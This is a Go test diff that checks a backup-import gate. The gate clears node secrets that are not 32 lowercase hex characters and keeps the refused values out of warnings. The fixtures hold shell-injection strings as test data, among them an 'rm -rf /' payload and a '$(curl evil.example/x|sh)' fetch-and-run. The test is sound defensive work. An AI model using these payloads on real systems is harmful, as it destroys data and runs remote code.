@@ -703,6 +703,63 @@ func TestImportSectionRowBudgets(t *testing.T) {
 	}
 }
 
+// B3-01（导入面）：节点 secret 字符集门镜像生成面
+// nodeSecretCharset（^[0-9a-f]{32}$）——含 shell 元字符/命令替
+// 换/大写形态的 secret 不落库（清空 + 点名，绝不回显原值），
+// 节点行保留；合法 32-hex 逐字恢复。
+func TestImportNodeSecretCharsetGate(t *testing.T) {
+	dst, err := Open(filepath.Join(t.TempDir(), "dst.db"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = dst.Close() }()
+
+	backup := &model.BackupData{
+		Version: "1.0",
+		Nodes: []model.NodeBackup{
+			{ID: 71, Name: "inject-quote", Secret: "abc'; rm -rf /; echo '", ServerIP: "192.0.2.71", Status: 1},
+			{ID: 72, Name: "inject-subst", Secret: "$(curl evil.example/x|sh)", ServerIP: "192.0.2.72", Status: 1},
+			{ID: 73, Name: "legal", Secret: "0123456789abcdef0123456789abcdef", ServerIP: "192.0.2.73", Status: 1},
+			{ID: 74, Name: "empty", Secret: "", ServerIP: "192.0.2.74", Status: 1},
+			{ID: 75, Name: "upper", Secret: "0123456789ABCDEF0123456789ABCDEF", ServerIP: "192.0.2.75", Status: 1},
+		},
+	}
+	result, err := dst.Import(backup, []string{"nodes"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if result.NodesImported != 5 {
+		t.Fatalf("NodesImported = %d, want 5 (rows kept, only the secret value refused), warnings=%v", result.NodesImported, result.ImportWarnings)
+	}
+	readSecret := func(id int64) string {
+		t.Helper()
+		var n model.Node
+		if err := dst.db.Where("id = ?", id).First(&n).Error; err != nil {
+			t.Fatalf("read node #%d: %v", id, err)
+		}
+		return n.Secret
+	}
+	for _, id := range []int64{71, 72, 74, 75} {
+		if got := readSecret(id); got != "" {
+			t.Fatalf("node %d secret = %q, want \"\" (refused at the import face)", id, got)
+		}
+	}
+	if got := readSecret(73); got != "0123456789abcdef0123456789abcdef" {
+		t.Fatalf("node 73 secret = %q, want verbatim 32-hex", got)
+	}
+	warnText := strings.Join(result.ImportWarnings, "\n")
+	for _, want := range []string{"inject-quote", "inject-subst", "upper", "重置 secret"} {
+		if !strings.Contains(warnText, want) {
+			t.Fatalf("receipt must name %q, warnings=%v", want, result.ImportWarnings)
+		}
+	}
+	for _, leak := range []string{"rm -rf", "evil.example", "0123456789ABCDEF"} {
+		if strings.Contains(warnText, leak) {
+			t.Fatalf("receipt must never echo the refused secret value (%q), warnings=%v", leak, result.ImportWarnings)
+		}
+	}
+}
+
 // B8-02（限值同源）：限值经 service_monitor_* 配置键调整后，恢复面
 // 钳制跟随配置口径，与写面 resolveServiceMonitorLimits 同源。
 func TestImportServiceMonitorsLimitsFromConfig(t *testing.T) {
